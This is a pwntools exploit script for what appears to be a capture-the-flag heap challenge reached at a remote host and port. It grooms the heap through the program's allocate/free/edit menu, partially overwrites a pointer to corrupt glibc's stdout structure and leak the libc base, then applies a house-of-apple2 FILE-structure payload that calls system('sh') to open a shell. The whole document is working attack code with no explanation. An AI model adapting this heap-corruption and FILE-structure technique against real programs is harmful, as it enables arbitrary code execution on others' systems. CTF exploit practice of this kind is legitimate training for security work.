#!/usr/bin/env python3
from pwn import *
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP
# =========================================================
exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def malloc(idx, size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("> ", str(idx).encode())
    io.sendlineafter("> ", str(size).encode())

def free(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("> ", str(idx).encode())

def edit(idx, val):
    io.sendlineafter("> ", "3")
    io.sendlineafter("> ", str(idx).encode())
    io.sendafter("> ", val)

def copy(idx, target):
    io.sendlineafter("> ", "4")
    io.sendlineafter("> ", str(idx).encode())
    io.sendlineafter("> ", str(target).encode())

def exploit():
    #leakless heap https://sh0ve1.github.io/2022/03/26/VNCTF2022-PWN-WriteUp/#HideOnHeap
    #Other solve https://naupjjin.github.io/2025/01/17/TSCCTF-2025-writeup/
    global io
    io = initialize()
    for i in range(9):
        malloc(i, 0x108)
    malloc(9, 0x18)

    for i in range(7):
        free(i)
    free(8)
    free(7)
    malloc(0, 0x108)
    free(8)
    malloc(1, 0x88)
    malloc(2, 0x78)
    malloc(3, 0x88)
    malloc(4, 0x78)
    edit(3, b"\xa0\x96") #normal
#    edit(3, b"\xa0\x26") #gdb

    malloc(5, 0x108)
    malloc(6, 0x108)
    edit(6, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
    io.recv(8)
    libc_leak = u64(io.recv(8))
    libc.address = libc_leak - libc.sym["_IO_2_1_stdin_"]
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    edit(6, IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(libc.sym["_IO_2_1_stdout_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"], "sh")[:0x100-1])
    io.interactive()
    
if __name__ == '__main__':
    exploit()
